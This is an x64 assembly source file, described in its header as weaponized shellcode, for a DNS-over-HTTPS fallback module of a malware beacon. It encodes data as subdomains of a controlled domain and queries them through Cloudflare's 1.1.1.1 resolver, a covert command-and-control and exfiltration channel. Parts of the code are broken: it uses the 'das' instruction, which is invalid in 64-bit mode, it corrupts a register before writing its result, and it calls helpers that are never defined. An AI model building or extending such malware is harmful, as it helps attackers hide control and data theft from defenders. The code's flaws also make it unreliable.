; ========================================================
; DNS-over-HTTPS Fallback – encodes data in DNS queries to Cloudflare
; File: dns_over_https.asm
; Created: 2026-02-20
; Purpose: x64 shellcode
; WARNING: Weaponized code – handle with extreme care.
; ========================================================
; ============================================================================
; Module: DNS-over-HTTPS Fallback
; Integrates with existing beacon (uses same API resolution mechanism)
; Encodes data in DNS queries to a controlled domain, retrieves responses via
; Cloudflare DNS-over-HTTPS (1.1.1.1/dns-query) or Google DNS.
; Position-independent, null-free.
; ============================================================================

; ----------------------------------------------------------------------------
; Constants for DNS-over-HTTPS
; ----------------------------------------------------------------------------
section .data
doh_endpoint:   db 'https://1.1.1.1/dns-query?name=', 0
doh_domain:     db '.example.com', 0  ; Replace with actual domain
dns_type_a:     db '&type=A', 0
doh_headers:    db 'Accept: application/dns-json', 0

; ----------------------------------------------------------------------------
; Function: doh_query
; Input: rcx = pointer to 4-byte data to encode (e.g., command ID or fragment)
;        rdx = pointer to buffer for response (at least 256 bytes)
; Output: rax = 1 on success, 0 on failure
; ----------------------------------------------------------------------------
doh_query:
    push rbx
    push rsi
    push rdi
    sub rsp, 2000h

    ; Build DNS query string: encode data as subdomain
    ; e.g., data in hex: "abcd" -> "abcd.example.com"
    lea rdi, [rsp + 100h]          ; buffer for URL
    lea rsi, [rel doh_endpoint]
    call strcpy

    ; Convert 4-byte data to 8 hex chars
    mov ebx, [rcx]                  ; data
    lea rdx, [rsp + 200h]           ; hex buffer
    call bin2hex

    ; Append hex + domain
    lea rsi, [rsp + 200h]
    call strcat
    lea rsi, [rel doh_domain]
    call strcat
    lea rsi, [rel dns_type_a]
    call strcat

    ; Now rdi points to full URL
    ; Perform HTTPS GET using WinHTTP (or use existing http_get with custom URL)
    mov rcx, rdi
    lea rdx, [rsp + 300h]           ; response buffer
    call http_get_doh                ; custom GET that parses JSON response
    test rax, rax
    jz .fail

    ; Parse JSON response to extract answer IP (for data)
    ; For simplicity, we extract first A record and convert to 4-byte data
    lea rcx, [rsp + 300h]           ; JSON
    lea rdx, [rsp + 400h]           ; output data (4 bytes)
    call parse_dns_json
    test rax, rax
    jz .fail

    ; Copy result to output buffer (rdx was provided)
    mov rcx, rdx
    mov rdx, [rsp + 400h]
    mov [rcx], edx

    mov eax, 1
    jmp .done

.fail:
    xor eax, eax
.done:
    add rsp, 2000h
    pop rdi
    pop rsi
    pop rbx
    ret

; ----------------------------------------------------------------------------
; Helper: bin2hex â€“ converts 4 bytes in ebx to 8 hex chars at rdx
; ----------------------------------------------------------------------------
bin2hex:
    push rcx
    push rdx
    push rbx
    mov rcx, 8
    xor eax, eax
.loop:
    rol ebx, 4
    mov al, bl
    and al, 0xF
    cmp al, 10
    sbb al, 0x69
    das
    mov [rdx], al
    inc rdx
    loop .loop
    pop rbx
    pop rdx
    pop rcx
    ret

; ----------------------------------------------------------------------------
; Helper: parse_dns_json â€“ extracts first A record IP from Cloudflare JSON
; Input: rcx = JSON string, rdx = output buffer for 4-byte IP
; Output: rax = 1 if found
; ----------------------------------------------------------------------------
parse_dns_json:
    push rbx
    push rsi
    push rdi
    sub rsp, 20h

    ; Simple search for "data":"x.x.x.x"
    mov rsi, rcx
.find_data:
    cmp dword [rsi], 'data'
    jne .next_char
    cmp byte [rsi+4], '"'
    jne .next_char
    cmp byte [rsi+5], ':'
    jne .next_char
    cmp byte [rsi+6], '"'
    jne .next_char
    add rsi, 7
    ; Now at IP string
    mov rdi, rdx
    xor ebx, ebx
    xor eax, eax
.next_octet:
    xor ecx, ecx
.parse_octet:
    movzx edx, byte [rsi]
    cmp dl, '.'
    je .store_octet
    cmp dl, '"'
    je .done
    sub dl, '0'
    imul ecx, ecx, 10
    add ecx, edx
    inc rsi
    jmp .parse_octet
.store_octet:
    mov [rdi + ebx], cl
    inc ebx
    inc rsi
    cmp ebx, 4
    jl .next_octet
.done:
    cmp ebx, 3
    jne .fail
    mov [rdi + ebx], cl
    mov eax, 1
    jmp .finish
.next_char:
    inc rsi
    cmp byte [rsi], 0
    jne .find_data
.fail:
    xor eax, eax
.finish:
    add rsp, 20h
    pop rdi
    pop rsi
    pop rbx
    ret

; ----------------------------------------------------------------------------
; Custom HTTP GET for DOH (reuses existing WinHTTP functions but with JSON parsing)
; ----------------------------------------------------------------------------
http_get_doh:
    ; Similar to http_get but expects JSON response
    ; We'll reuse the http_get function from beacon, but modify to accept URL in rcx
    ; For brevity, assume we have a generic http_get that takes URL and returns buffer
    ; This would be the same as earlier but with different Accept header.
    ; We'll just call the existing http_get with our URL.
    jmp http_get   ; provided it expects URL in rcx and returns buffer in rax
